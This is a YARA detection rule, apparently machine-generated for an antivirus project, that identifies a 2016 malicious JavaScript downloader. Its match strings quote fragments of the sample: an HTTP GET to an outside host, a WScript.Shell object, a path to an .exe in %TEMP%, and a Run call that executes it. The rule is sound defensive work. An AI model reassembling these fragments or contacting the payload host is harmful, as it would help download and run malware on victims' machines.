rule sig_20160330_abd8e6af542146533710bb66f869b1c7 {
  meta:
    description = "datamaliciousorder - file 20160330_abd8e6af542146533710bb66f869b1c7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1bea9288c8b504c984a32fa67a6d941df411e580bc63e9671dd1d242bf872ef3"

  strings:
    $s1  = "_WP[_I](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s2  = "function _A(_L, _ZR){_W = _W * 1; return _L - _ZR;};" fullword ascii
    $s3  = "var _YR = function _O() {return WScript[_FK](\"WScript\"+\".Shell\");}(), _C = 11;" fullword ascii
    $s4  = "if (_WP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U() {return _YR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oQGcIpGpE.ex\" + \"e\";};" fullword ascii
    $s6  = "function _JO(){return _NJ + \"\";};" fullword ascii
    $s7  = "function _KL() {return ((_VA == true) && (_VA == _J)) ? 1 : _W;};" fullword ascii
    $s8  = "function _XC(_F0){_YR[\"Run\"](_F0, _W, _W);};" fullword ascii
    $s9  = "function _R(){return 22;};" fullword ascii
    $s10 = "function _N()" fullword ascii
    $s11 = "function _XQ(_F) {var _K0 = (1, 2, 3, 4, 5, _F); return _K0;};" fullword ascii
    $s12 = "return _A(_YX, _H);" fullword ascii
    $s13 = "function _K(){return _FK;};" fullword ascii
    $s14 = "var _MV = new this[\"Date\"]();" fullword ascii
    $s15 = " while (_U0){" fullword ascii
    $s16 = "var _J = false;" fullword ascii
    $s17 = "_J = true; " fullword ascii
    $s18 = "_VA = true; " fullword ascii
    $s19 = "var _VA = false;" fullword ascii
    $s20 = "var _SY = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}